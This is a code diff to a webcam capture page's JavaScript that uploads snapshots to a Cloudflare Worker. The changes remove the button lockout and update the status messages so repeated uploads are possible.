@@ -1,4 +1,3 @@
-// PASTE YOUR CLOUDFLARE WORKER URL HERE:
 const WORKER_URL = "https://verify.ryancustard8-8af.workers.dev";
 
 const video = document.getElementById('webcam');
@@ -14,19 +13,17 @@ async function startCamera() {
     } catch (error) {
         statusText.innerText = "Camera access denied. Please allow camera permissions.";
         statusText.style.color = "#ff4444";
-        captureBtn.disabled = true;
     }
 }
 
-// 2. Handle the button click
+// 2. Handle the button click (No cooldown, fully spamable, never locks out)
 captureBtn.addEventListener('click', async () => {
-    statusText.innerText = "Encrypting and uploading...";
+    statusText.innerText = "Encrypting and uploading bundle...";
     statusText.style.color = "#ffaa00";
-    captureBtn.disabled = true;
 
     // Freeze the frame by drawing it to a hidden canvas
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
     // Convert canvas image to a file (Blob)
@@ -42,19 +39,17 @@ captureBtn.addEventListener('click', async () => {
             });
 
             if (response.ok) {
-                statusText.innerText = "✅ Verification Successful! You may close this page.";
+                statusText.innerText = "✅ Sent successfully! Ready to send another.";
                 statusText.style.color = "#00cc66";
             } else {
-                // If it fails, grab the exact error text from the Worker
                 const errorDetail = await response.text();
                 console.error("Backend Error Details:", errorDetail);
                 throw new Error(errorDetail);
             }
         } catch (err) {
             console.error("Full upload error:", err);
-            statusText.innerText = "❌ Upload failed. Please refresh and try again.";
+            statusText.innerText = "❌ Upload failed. Button is ready to retry.";
             statusText.style.color = "#ff4444";
-            captureBtn.disabled = false;
         }
     }, 'image/png');
 });
